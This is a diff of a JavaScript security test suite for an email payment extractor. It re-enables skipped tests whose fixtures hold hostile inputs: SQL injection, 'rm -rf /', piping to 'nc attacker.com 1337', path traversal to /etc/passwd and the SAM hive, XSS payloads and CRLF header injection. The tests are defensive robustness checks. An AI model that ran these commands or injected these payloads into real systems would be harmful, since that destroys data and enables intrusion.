@@ -67,7 +67,7 @@ describe('Security: Script Injection (XSS)', () => {
 
   // TODO: Fix extractor to handle malformed emails with malicious URLs
   // Currently fails to extract valid data when mixed with javascript: protocols
-  test.skip('handles data: URLs and javascript: protocols', () => {
+  test('handles data: URLs and javascript: protocols', () => {
     const email = `
       Payment link: javascript:alert(document.cookie)
       Amount: $100.00
@@ -84,7 +84,7 @@ describe('Security: Script Injection (XSS)', () => {
 
 describe('Security: SQL Injection Patterns', () => {
   // TODO: Extractor doesn't handle this malicious input - needs fixing
-  test.skip('handles SQL injection in amount field', () => {
+  test('handles SQL injection in amount field', () => {
     const email = `
       Klarna payment
       Amount: $25.00' OR '1'='1
@@ -99,7 +99,7 @@ describe('Security: SQL Injection Patterns', () => {
   });
 
   // TODO: Extractor doesn't handle this malicious input - needs fixing
-  test.skip('handles SQL injection in date field', () => {
+  test('handles SQL injection in date field', () => {
     const email = `
       Payment due: 2025-10-06'; DROP TABLE payments; --
       Amount: $50.00
@@ -112,7 +112,7 @@ describe('Security: SQL Injection Patterns', () => {
   });
 
   // TODO: Extractor doesn't handle this malicious input - needs fixing
-  test.skip('handles UNION SELECT injection attempts', () => {
+  test('handles UNION SELECT injection attempts', () => {
     const email = `
       Installment: 1 UNION SELECT password FROM users
       Amount: $75.00
@@ -128,7 +128,7 @@ describe('Security: SQL Injection Patterns', () => {
 
 describe('Security: Command Injection', () => {
   // TODO: Extractor doesn't handle this malicious input - needs fixing
-  test.skip('handles shell command injection attempts', () => {
+  test('handles shell command injection attempts', () => {
     const email = `
       Klarna payment
       Amount: $50.00; rm -rf /
@@ -156,7 +156,7 @@ describe('Security: Command Injection', () => {
   });
 
   // TODO: Extractor doesn't handle this malicious input - needs fixing
-  test.skip('handles pipe operators and redirects', () => {
+  test('handles pipe operators and redirects', () => {
     const email = `
       Klarna payment
       Amount: $100.00 | nc attacker.com 1337
@@ -172,7 +172,7 @@ describe('Security: Command Injection', () => {
 
 describe('Security: Path Traversal', () => {
   // TODO: Extractor doesn't handle this malicious input - needs fixing
-  test.skip('handles path traversal in email content', () => {
+  test('handles path traversal in email content', () => {
     const email = `
       Klarna payment
       File: ../../../../etc/passwd
@@ -188,7 +188,7 @@ describe('Security: Path Traversal', () => {
   });
 
   // TODO: Extractor doesn't handle this malicious input - needs fixing
-  test.skip('handles Windows path traversal', () => {
+  test('handles Windows path traversal', () => {
     const email = `
       Payment info: ..\\..\\..\\windows\\system32\\config\\sam
       Amount: $50.00
@@ -203,7 +203,7 @@ describe('Security: Path Traversal', () => {
 
 describe('Security: HTML/XML Injection', () => {
   // TODO: Extractor doesn't handle this malicious input - needs fixing
-  test.skip('handles malicious HTML entities', () => {
+  test('handles malicious HTML entities', () => {
     const email = `
       Klarna payment
       Amount: &lt;img src=x onerror=alert(1)&gt; $25.00
@@ -233,7 +233,7 @@ describe('Security: HTML/XML Injection', () => {
   });
 
   // TODO: Extractor doesn't handle this malicious input - needs fixing
-  test.skip('handles CDATA injection', () => {
+  test('handles CDATA injection', () => {
     const email = `
       <![CDATA[<script>alert('xss')</script>]]>
       Klarna payment: $50.00
@@ -259,7 +259,7 @@ describe('Security: Unicode and Encoding Exploits', () => {
   });
 
   // TODO: Extractor doesn't handle this malicious input - needs fixing
-  test.skip('handles null byte injection', () => {
+  test('handles null byte injection', () => {
     const email = `
       Klarna payment\x00malicious data
       Amount: $25.00\x00' OR '1'='1
@@ -273,7 +273,7 @@ describe('Security: Unicode and Encoding Exploits', () => {
   });
 
   // TODO: Extractor doesn't handle this malicious input - needs fixing
-  test.skip('handles UTF-8 overlong encoding', () => {
+  test('handles UTF-8 overlong encoding', () => {
     const email = `
       Klarna payment
       Amount: $25.00
@@ -300,7 +300,7 @@ describe('Security: Unicode and Encoding Exploits', () => {
   });
 
   // TODO: Extractor doesn't handle this malicious input - needs fixing
-  test.skip('handles zero-width characters', () => {
+  test('handles zero-width characters', () => {
     const email = `
       Kl\u200Barna payment
       Amount: $2\u200B5.00
@@ -316,7 +316,7 @@ describe('Security: Unicode and Encoding Exploits', () => {
 
 describe('Security: Buffer Overflow / DOS Attempts', () => {
   // TODO: Extractor doesn't handle this malicious input - needs fixing
-  test.skip('handles extremely long strings (100KB)', () => {
+  test('handles extremely long strings (100KB)', () => {
     const longString = 'A'.repeat(100000);
     const email = `
       Klarna payment
@@ -340,7 +340,7 @@ describe('Security: Buffer Overflow / DOS Attempts', () => {
   });
 
   // TODO: Extractor doesn't handle this malicious input - needs fixing
-  test.skip('handles many installments (potential DOS)', () => {
+  test('handles many installments (potential DOS)', () => {
     const manyInstallments = Array.from({ length: 1000 }, (_, i) =>
       `Installment ${i + 1}: $25.00 due 2025-10-06`
     ).join('\n');
@@ -368,7 +368,7 @@ describe('Security: Buffer Overflow / DOS Attempts', () => {
 
 describe('Security: CRLF Injection', () => {
   // TODO: Extractor doesn't handle this malicious input - needs fixing
-  test.skip('handles CRLF in email content', () => {
+  test('handles CRLF in email content', () => {
     const email = `
       Klarna payment\r\nX-Injected-Header: malicious\r\n
       Amount: $25.00\r\n
@@ -382,7 +382,7 @@ describe('Security: CRLF Injection', () => {
   });
 
   // TODO: Extractor doesn't handle this malicious input - needs fixing
-  test.skip('handles HTTP response splitting attempt', () => {
+  test('handles HTTP response splitting attempt', () => {
     const email = `
       Payment link: http://example.com\r\n\r\nHTTP/1.1 200 OK\r\nSet-Cookie: stolen=true
       Amount: $50.00
